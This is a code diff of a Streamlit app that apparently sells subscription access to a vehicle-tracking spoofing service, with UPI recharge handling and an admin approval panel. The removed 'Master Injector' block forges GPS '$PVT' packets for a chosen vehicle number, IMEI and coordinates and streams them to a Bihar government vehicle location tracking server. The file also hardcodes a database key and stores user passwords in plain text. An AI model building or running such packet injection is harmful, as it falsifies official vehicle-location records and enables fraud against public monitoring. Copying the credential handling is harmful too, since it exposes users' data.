@@ -9,7 +9,7 @@ from supabase import create_client, Client
 # --- CONFIG ---
 SUPABASE_URL = "https://grdgexcjyrhkoffimsuw.supabase.co"
 SUPABASE_KEY = "sb_publishable_48s5EvLGqu_gLXDxmRiqMQ_E34kVKqW"
-# ImgBB Direct Link
+# ImgBB Direct Link (Optimized)
 QR_URL = "https://i.ibb.co/99P60H1z/Whats-App-Image-2026-03-30-at-23-26-19.jpg"
 
 supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
@@ -123,41 +123,57 @@ def contact_us_page(reason="general"):
 
 def recharge_page():
     contact = get_contact_details()
-    cid = st.session_state.u_data.get('cid_id', 0)
+    u_data = st.session_state.u_data
+    cid = u_data.get('cid_id', 0)
     st.title("💳 Recharge Your Plan")
     
-    # 2 Columns Layout with explicit widths
-    col_left, col_right = st.columns([1.2, 2])
+    # Layout with 3 columns to prevent image overlap
+    col_img, col_form = st.columns([1, 2])
     
-    with col_left:
-        # Strict width control to prevent overlap
-        st.image(QR_URL, caption="Scan QR to Pay", width=230)
-        st.info(f"Customer ID: **CID-{1000 + cid}**")
+    with col_img:
+        st.image(QR_URL, caption="Scan QR to Pay", width=200) # Smaller QR
+        st.info(f"Verify Your ID: **CID-{1000 + cid}**")
         
-    with col_right:
+    with col_form:
         st.subheader("Step 1: Pay via UPI")
-        st.markdown(f"**UPI ID:** `{contact.get('upi_id', 'admin@upi')}`")
-        st.warning(f"⚠️ Payment note mein **CID-{1000 + cid}** likhna na bhoolein.")
+        st.info(f"**UPI ID:** `{contact.get('upi_id', 'admin@upi')}`")
         
         st.divider()
-        st.subheader("Step 2: Submit Details")
+        st.subheader("Step 2: Submit Payment Details")
+        
+        c1, c2 = st.columns(2)
+        confirm_cid = c1.text_input("Confirm Customer ID", value=f"CID-{1000+cid}")
+        mobile_no = c2.text_input("Mobile Number", placeholder="Enter 10 digit number")
+        
         utr = st.text_input("UTR / Transaction ID", placeholder="12 digit number")
         plans = get_plans()
         amt_list = [f"₹{p['amount']} - {p['plan_name']} ({p['days']} Days)" for p in plans]
         amt = st.selectbox("Choose Plan", amt_list if amt_list else ["Standard Plan"])
         
         if st.button("Submit Recharge Request", use_container_width=True):
-            if utr:
-                try:
-                    supabase.table("recharge_requests").insert({"username": st.session_state.user, "utr_number": utr, "amount": amt}).execute()
-                    st.success("✅ Request Sent! Admin jald hi approve kar denge.")
-                    time.sleep(2)
-                    st.session_state.page = "dashboard"
-                    st.rerun()
-                except:
-                    st.error("Ye UTR pehle hi submit ho chuka hai.")
+            if utr and mobile_no:
+                # --- CHECK DB FOR DUPLICATE UTR ---
+                existing = supabase.table("recharge_requests").select("id").eq("utr_number", utr).execute()
+                
+                if len(existing.data) > 0:
+                    st.error(f"❌ Error: UTR `{utr}` pehle hi submit ho chuka hai. Kripya naya payment karein.")
+                else:
+                    try:
+                        supabase.table("recharge_requests").insert({
+                            "username": st.session_state.user, 
+                            "utr_number": utr, 
+                            "amount": amt,
+                            "mobile_no": mobile_no,
+                            "cid_display": confirm_cid
+                        }).execute()
+                        st.success("✅ Request Sent! Admin jald hi approve kar denge.")
+                        time.sleep(2)
+                        st.session_state.page = "dashboard"
+                        st.rerun()
+                    except Exception as e:
+                        st.error(f"System Error: {str(e)}")
             else:
-                st.error("Kripya UTR number bharein.")
+                st.warning("Kripya Mobile Number aur UTR dono bharein.")
                 
     if st.button("⬅️ Back to Home"):
         st.session_state.page = "dashboard"
@@ -210,24 +226,27 @@ def admin_panel():
             if st.form_submit_button("Create User"):
                 supabase.table("user_profiles").insert({"username": nu, "password": np, "latitude": lat, "longitude": lon, "expiry_date": (datetime.now() + timedelta(days=28)).strftime("%Y-%m-%d"), "status": "active"}).execute(); st.success("Created!")
 
-    with menu[1]:
-        st.subheader("🚀 Master Injector")
-        vno, imei = st.text_input("V-No", "BR01P1234").upper(), st.text_input("IMEI", "865432109876543")
-        lat_m, lon_m = st.number_input("Lat Master", 25.5941, format="%.7f"), st.number_input("Lon Master", 85.1376, format="%.7f")
-        if not st.session_state.admin_running:
-            if st.button("🔥 START MASTER", type="primary", use_container_width=True): st.session_state.admin_running = True; st.rerun()
-        else:
-            if st.button("🛑 STOP MASTER", use_container_width=True): st.session_state.admin_running = False; st.rerun()
-            str_area, status_area = st.empty(), st.empty()
-            while st.session_state.admin_running:
-                res, tags, dt = [], get_tags(), datetime.now().strftime("%d%m%Y,%H%M%S")
-                str_area.code(f"预览: $PVT,{tags[0]},2.1.1,NR,01,L,{imei},{vno},1,{dt}...")
-                for t in tags:
-                    p = f"$PVT,{t},2.1.1,NR,01,L,{imei},{vno},1,{dt},{lat_m:.7f},N,{lon_m:.7f},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*"
-                    th = threading.Thread(target=send_packet_thread, args=("vlts.bihar.gov.in", 9999, p, res, True))
-                    th.start(); th.join()
-                status_area.table(pd.DataFrame(res)); time.sleep(1.0)
-    
+    with menu[2]:
+        st.subheader("Pending Recharges")
+        reqs = supabase.table("recharge_requests").select("*").eq("status", "pending").execute()
+        if reqs.data:
+            df_reqs = pd.DataFrame(reqs.data)
+            # Display important columns for admin
+            st.dataframe(df_reqs[['username', 'utr_number', 'amount', 'mobile_no', 'cid_display']])
+            for r in reqs.data:
+                col1, col2 = st.columns([3, 1])
+                col1.write(f"👤 {r['username']} | UTR: {r['utr_number']} | Mob: {r.get('mobile_no', 'N/A')}")
+                if col2.button("Approve", key=f"app_{r['id']}"):
+                    try: days_to_add = int(r['amount'].split('(')[1].split(' ')[0])
+                    except: days_to_add = 28
+                    user_res = supabase.table("user_profiles").select("expiry_date").eq("username", r['username']).execute()
+                    current_exp = datetime.strptime(user_res.data[0]['expiry_date'], '%Y-%m-%d')
+                    new_exp = max(current_exp, datetime.now()) + timedelta(days=days_to_add)
+                    supabase.table("user_profiles").update({"expiry_date": new_exp.strftime("%Y-%m-%d"), "status": "active"}).eq("username", r['username']).execute()
+                    supabase.table("recharge_requests").update({"status": "approved"}).eq("id", r['id']).execute()
+                    st.success("Approved & Activated!"); st.rerun()
+        else: st.write("No requests.")
+
     with menu[3]:
         st.subheader("⚙️ System Settings")
         curr = get_contact_details()
@@ -247,18 +266,13 @@ def user_panel():
     if u_data.get('status') == 'inactive' or days <= 0:
         if u_data.get('status') == 'inactive': st.sidebar.error("❌ Account Deactivated")
         else: st.sidebar.error("🚫 Plan Expired")
-        
-        # Inactive/Expired Sidebar Actions
         if st.sidebar.button("💳 Recharge Now", use_container_width=True): st.session_state.page = "recharge"; st.rerun()
         if st.sidebar.button("📞 Contact Support", use_container_width=True): st.session_state.page = "contact"; st.rerun()
         if st.sidebar.button("Logout", use_container_width=True): st.session_state.logged_in = False; st.rerun()
-        
-        # Navigation
         if st.session_state.page == "recharge": recharge_page()
         else: contact_us_page(reason="deactivated")
         return
 
-    # Active User Actions
     st.sidebar.success(f"📅 {days} Days Left")
     if st.sidebar.button("💳 Recharge Plan", use_container_width=True): st.session_state.page = "recharge"; st.rerun()
     if st.sidebar.button("📞 Help / Contact", use_container_width=True): st.session_state.page = "contact"; st.rerun()
